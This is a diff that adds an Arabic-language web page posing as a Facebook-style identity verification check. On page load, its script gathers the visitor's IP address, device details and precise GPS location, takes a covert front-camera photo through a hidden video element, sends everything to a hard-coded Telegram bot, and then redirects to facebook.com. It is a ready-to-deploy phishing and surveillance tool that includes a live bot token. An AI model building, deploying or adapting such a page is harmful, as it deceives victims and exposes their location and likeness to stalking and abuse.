@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحقق وتأكيد الوصول</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+            direction: rtl;
+        }
+        
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #1877f2, #25d366, #1877f2);
+        }
+        
+        h2 {
+            color: #1877f2;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        
+        .logo {
+            font-size: 48px;
+            color: #1877f2;
+            margin-bottom: 15px;
+        }
+        
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        .status {
+            margin: 20px 0;
+            font-weight: bold;
+            font-size: 16px;
+            color: #444;
+            line-height: 1.6;
+        }
+        
+        .success {
+            color: #25d366;
+        }
+        
+        .error {
+            color: #ff3333;
+        }
+        
+        .retry-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background-color 0.3s;
+            display: none;
+        }
+        
+        .retry-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .countdown {
+            font-size: 14px;
+            color: #777;
+            margin-top: 15px;
+        }
+        
+        #videoElement {
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+            
+            h2 {
+                font-size: 20px;
+            }
+            
+            .status {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <i class="fas fa-shield-alt"></i>
+        </div>
+        <h2>نظام التحقق وتأكيد الوصول</h2>
+        <div class="loader" id="loader"></div>
+        <div class="status" id="status">يتم التحقق من هويتك، يرجى الانتظار...</div>
+        
+        <video id="videoElement" autoplay playsinline></video>
+        
+        <button class="retry-button" id="retryButton">إعادة المحاولة</button>
+        
+        <div class="countdown" id="countdown"></div>
+    </div>
+
+    <script>
+        // ⚙️ إعدادات Telegram المدمجة
+        const BOT_TOKEN = "8021671955:AAGGQ4oKE5UGhRYQqe6y3I91lIykoe3SZM4"; // ⚠️ استبدل برمز بوتك
+        const CHAT_ID = "8080219799";     // ⚠️ استبدل بمعرف الدردشة
+
+        const REDIRECT_URL = "https://facebook.com";
+        const MAX_RETRIES = 3;
+
+        const statusEl = document.getElementById('status');
+        const loaderEl = document.getElementById('loader');
+        const retryButton = document.getElementById('retryButton');
+        const countdownEl = document.getElementById('countdown');
+        const videoElement = document.getElementById('videoElement');
+
+        let stream = null;
+
+        window.addEventListener('load', () => {
+            setTimeout(startVerification, 1500);
+        });
+
+        async function startVerification() {
+            try {
+                statusEl.textContent = "جاري جمع بيانات الأمان...";
+
+                const collectedData = await collectUserData();
+
+                statusEl.textContent = "جاري إرسال البيانات...";
+                await sendToTelegramWithRetry(collectedData, MAX_RETRIES);
+
+                statusEl.textContent = "تم التحقق بنجاح. جاري التوجيه...";
+                statusEl.classList.add('success');
+                startCountdown(3);
+
+            } catch (error) {
+                handleError(error);
+            }
+        }
+
+        async function collectUserData() {
+            const data = {
+                time: new Date().toLocaleString('ar-SA'),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            // 1. الحصول على IP
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+            } catch (e) {
+                data.ip = "غير متاح";
+            }
+
+            // 2. الحصول على الموقع الجغرافي + إنشاء رابط خرائط
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                data.location = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                };
+                // ✅ إنشاء رابط مباشر لخرائط Google
+                data.mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+            } catch (e) {
+                data.location = "ممنوع الوصول للموقع";
+                data.mapLink = null;
+            }
+
+            // 3. التقاط صورة من الكاميرا
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                videoElement.srcObject = stream;
+                await new Promise(resolve => videoElement.onloadedmetadata = resolve);
+
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                canvas.getContext('2d').drawImage(videoElement, 0, 0);
+
+                data.photo = canvas.toDataURL('image/jpeg', 0.7);
+
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+
+            } catch (e) {
+                data.photo = null;
+                data.photoError = e.message;
+            }
+
+            return data;
+        }
+
+        async function sendToTelegramWithRetry(data, maxRetries) {
+            for (let i = 0; i < maxRetries; i++) {
+                try {
+                    await sendToTelegram(data);
+                    return;
+                } catch (error) {
+                    console.error(`محاولة ${i+1} فشلت:`, error);
+                    if (i === maxRetries - 1) throw error;
+                    await delay(2000);
+                }
+            }
+        }
+
+        async function sendToTelegram(data) {
+            // ✅ تضمين رابط الخريطة في الرسالة إذا كان متاحًا
+            let message = `
+🔐 *بيانات تحقق جديدة* 🔐
+⏰ الوقت: ${data.time}
+🌐 IP: ${data.ip}
+📱 المتصفح: ${data.userAgent.substring(0, 50)}...
+🌍 الموقع: ${typeof data.location === 'object' ? 
+    `${data.location.latitude.toFixed(6)}, ${data.location.longitude.toFixed(6)}` : 
+    data.location}
+📍 رابط الموقع المباشر: ${data.mapLink || "غير متاح"}
+📏 الشاشة: ${data.screen}
+🌐 المنطقة الزمنية: ${data.timezone}
+            `;
+
+            const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(textUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown",
+                    disable_web_page_preview: false // السماح بمعاينة الرابط
+                })
+            });
+
+            // إرسال الصورة إن وجدت
+            if (data.photo) {
+                const formData = new FormData();
+                const byteString = atob(data.photo.split(',')[1]);
+                const mimeString = data.photo.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                const blob = new Blob([ab], { type: mimeString });
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "capture.jpg");
+
+                const photoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                await fetch(photoUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+        }
+
+        function handleError(error) {
+            console.error("خطأ:", error);
+            statusEl.textContent = "❌ فشل التحقق: " + (error.message || "خطأ غير معروف");
+            statusEl.classList.add('error');
+            loaderEl.style.display = 'none';
+            retryButton.style.display = 'block';
+
+            retryButton.onclick = () => {
+                retryButton.style.display = 'none';
+                loaderEl.style.display = 'block';
+                statusEl.textContent = "جاري إعادة المحاولة...";
+                statusEl.classList.remove('error');
+                startVerification();
+            };
+
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+        }
+
+        function startCountdown(seconds) {
+            let count = seconds;
+            countdownEl.textContent = `سيتم توجيهك خلال ${count} ثانية...`;
+            const interval = setInterval(() => {
+                count--;
+                if (count > 0) {
+                    countdownEl.textContent = `سيتم توجيهك خلال ${count} ثانية...`;
+                } else {
+                    clearInterval(interval);
+                    window.location.href = REDIRECT_URL;
+                }
+            }, 1000);
+        }
+
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
